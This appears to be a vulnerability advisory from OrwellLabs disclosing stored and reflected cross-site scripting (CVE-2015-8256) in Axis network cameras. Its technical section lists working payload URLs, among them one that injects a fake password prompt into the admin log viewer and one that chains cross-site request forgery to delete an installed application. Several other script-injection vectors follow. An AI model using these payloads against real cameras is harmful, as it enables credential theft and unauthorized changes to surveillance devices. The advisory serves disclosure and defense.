@@ -1,0 +1,138 @@
+                         _ _ _       _
+                        | | | |     | |
+  ___  _ ____      _____| | | | __ _| |__  ___
+ / _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|   6079 Smith W
+| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \   doubleplusungood
+ \___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/   owning some telescreens...
+
+
+ Security Adivisory
+    2016-04-09
+                www.orwelllabs.com
+                  twt:@orwelllabs
+
+
+
+
+
+I. ADVISORY INFORMATION
+-----------------------
+Title: Axis Network Cameras Multiple Cross-site scripting
+Vendor: Axis Communications
+Class: Improper Input Validation [CWE-20]
+CVE Name: CVE-2015-8256
+Remotely Exploitable: Yes
+Locally Exploitable: No
+OLSA-ID: OLSA-2015-8256
+Adivisory URL:
+http://www.orwelllabs.com/2016/01/axis-network-cameras-multiple-cross.html
+
+
+II. Background
+--------------
+Axis is the market leader in network video, invented the world’s first
+network camera back in 1996 and we’ve been innovators in video surveillance
+ever since. Axis network video products are installed in public places and
+areas such as retail chains, airports, trains, motorways, universities,
+prisons, casinos and banks.
+
+III. vulnerability
+------------------
+AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
+scripting vulnerability.
+
+IV. technical details
+---------------------
+These attack vectors allow you to execute an arbitrary javascript code in
+the user browser (session) with this steps:
+
+# 1 Attacker injects a javascript payload in the vulnerable page:
+http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script
+type="text/javascript>prompt("AXIS_PASSWORD:")</script>
+
+This will create a entry in the genneral log file (/var/log/messages) So,
+when the user is viewing the log 'system options' -> 'support' -> 'Logs &
+Reports':
+
+http://{axishost}/axis-cgi/admin/systemlog.cgi?id
+will be displayed a prompt for the password of the current user
+('AXIS_PASSWORD').
+
+However, due to CSRF presented is even possible to perform all actions
+already presented: create, edit and remove users and applications, etc. For
+example, to delete an application "axis_update" via SXSS:
+
+http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script src="http://
+axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml"></script>
+
+* A reflected cross-site scripting affects all models of AXIS devices on
+the same parameter:
+http://
+{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert('AXIS-XSS')</script><!--
+
+# Other Vectors
+http://
+{axishost}/admin/config.shtml?group=%3Cscript%3Ealert%281%29%3C/script%3E
+
+http://{axishost}/view/custom_whiteBalance.shtml?imagePath=<img src="xs"
+onerror=alert(7) /><!--
+http://
+{axishost}/admin-bin/editcgi.cgi?file=<script>alert('SmithW')</script>
+
+http://
+{axishost}/operator/recipient_test.shtml?protocol=%3Cscript%3Ealert%281%29%3C/script%3E
+
+http://
+{axishost}/admin/showReport.shtml?content=alwaysmulti.sdp&pageTitle=axis</title></head><body><pre><script>alert(1)</script>
+
+# SCRIPTPATHS:
+
+{HTMLROOT}/showReport.shtml
+{HTMLROOT}/config.shtml
+{HTMLROOT}/incl/top_incl.shtml
+{HTMLROOT}/incl/popup_header.shtml
+{HTMLROOT}/incl/page_header.shtml
+{HTMLROOT}/incl/top_incl_popup.shtml
+{HTMLROOT}/viewAreas.shtml
+{HTMLROOT}/vmd.shtml
+{HTMLROOT}/custom_whiteBalance.shtml
+{HTMLROOT}/playWindow.shtml
+{HTMLROOT}/incl/ptz_incl.shtml
+{HTMLROOT}/view.shtml
+{HTMLROOT}/streampreview.shtml
+
+And many, many others...
+
+V. Impact
+---------
+allows to run arbitrary code on a victim's browser and computer if combined
+with another flaws in the same devices.
+
+VI. Affected products
+---------------------
+Multiple Axis Network products.
+
+VII. solution
+-------------
+It was not provided any solution to the problem.
+
+VIII. Credits
+-------------
+The vulnerability has been discovered by SmithW from OrwellLabs
+
+IX. Legal Notices
+-----------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
+X. Vendor solutions and workarounds
+-----------------------------------
+There was no response from the vendor.
+
+
+About Orwelllabs
+++++++++++++++++
+Orwelllabs is a (doubleplusungood) security research lab interested in embedded
+device & webapp hacking.
